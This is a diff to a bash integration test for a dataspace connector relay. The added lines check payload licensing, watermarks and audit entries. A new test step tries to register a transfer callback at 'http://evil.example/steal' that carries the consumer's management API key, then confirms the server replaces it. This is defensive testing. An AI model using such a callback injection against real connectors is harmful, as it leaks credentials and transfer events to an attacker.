@@ -37,12 +37,15 @@ log "3. HttpData-PULL transfer -> EDR -> pull the confidential payload through $
 PAYLOAD=$(pull "$CONSUMER" "$PROVIDER" "$AGR")
 echo "$PAYLOAD" | jq .
 [[ $(jq -r .assetClass <<<"$PAYLOAD") == ProcessCapability ]] && pass "confidential payload received" || fail "payload: $PAYLOAD"
+[[ $(jq -r '._reedLicense.licensee' <<<"$PAYLOAD") == "$(bpn_of "$CONSUMER")" && $(jq -r '._reedLicense.watermark | length' <<<"$PAYLOAD") == 64 ]] \
+  && pass "released by $PROVIDER's own data service under a licence to $(bpn_of "$CONSUMER"), watermarked" \
+  || fail "payload carries no licence for $(bpn_of "$CONSUMER")"
 
 log "4. REED audit trail (usage layer)"
 AUDIT=$(api "$(token reed-admin)" GET /reed/audit)
 jq --arg a "$ASSET_ID" '[.[] | select(.assetId == $a and .eventType == "PULL")] | .[0]' <<<"$AUDIT"
 CONSUMER_BPN=$(bpn_of "$CONSUMER")
-[[ $(jq -r --arg a "$ASSET_ID" '[.[] | select(.assetId == $a and .eventType == "PULL")][0].detail' <<<"$AUDIT") == *"by $CONSUMER_BPN (verified: contract agreement"* ]] \
+[[ $(jq -r --arg a "$ASSET_ID" '[.[] | select(.assetId == $a and .eventType == "PULL")][0].detail' <<<"$AUDIT") == *"to $CONSUMER_BPN (verified: contract agreement"* ]] \
   && pass "PULL recorded, consumer $CONSUMER_BPN verified against the contract agreement" \
   || fail "no PULL audit event naming $CONSUMER_BPN with a verified agreement"
 
@@ -64,6 +67,19 @@ echo "  hanse sees: $ids"
 CCAT=$(catalog castellum nordvind)
 [[ $(jq -c '[.dataset // [] | (if type=="array" then . else [.] end)[] | ."@id"]' <<<"$CCAT") == *bill-of-material-nordvind* ]] \
   && pass "castellum (supplies Nordvind) does see the bilateral BOM" || fail "castellum cannot see the BOM"
+
+# ---------- the relay cannot be abused ----------
+log "7. the REED relay only forwards what the dashboard needs, and sets callbacks itself"
+ADMIN=$(token reed-admin)
+api "$ADMIN" POST "/reed/connectors/$CONSUMER/v4/assets/request" "$QS" >/dev/null
+[[ $(status) == 403 ]] && pass "asset management through the relay -> 403" || fail "relay allowed assets/request ($(status))"
+AGR2=$(mgmt "$CONSUMER" POST /v4/contractagreements/request "$QS" | jq -r '.[0]["@id"]')
+TP=$(api "$ADMIN" POST "/reed/connectors/$CONSUMER/v4/transferprocesses" '{"@context": '"$CTX"', "@type": "TransferRequest",
+  "counterPartyAddress": "'"$(dsp_of "$PROVIDER")"'", "protocol": "'$PROTO'", "contractId": "'"$AGR2"'", "transferType": "HttpData-PULL",
+  "callbackAddresses": [{"@type": "CallbackAddress", "uri": "http://evil.example/steal", "events": ["transfer.process.started"],
+  "https://w3id.org/edc/v0.0.1/ns/authKey": "X-Api-Key", "https://w3id.org/edc/v0.0.1/ns/authCodeId": "'"$CONSUMER"'-mgmt-api-key"}]}' | jq -r '."@id"')
+CBS=$(mgmt "$CONSUMER" GET "/v4/transferprocesses/$TP" | jq -c '[.callbackAddresses[] | .uri]')
+[[ $CBS != *evil* ]] && pass "caller-supplied callback replaced by the server's ($CBS)" || fail "caller callback kept: $CBS"
 
 log "done"
 exit $FAILED
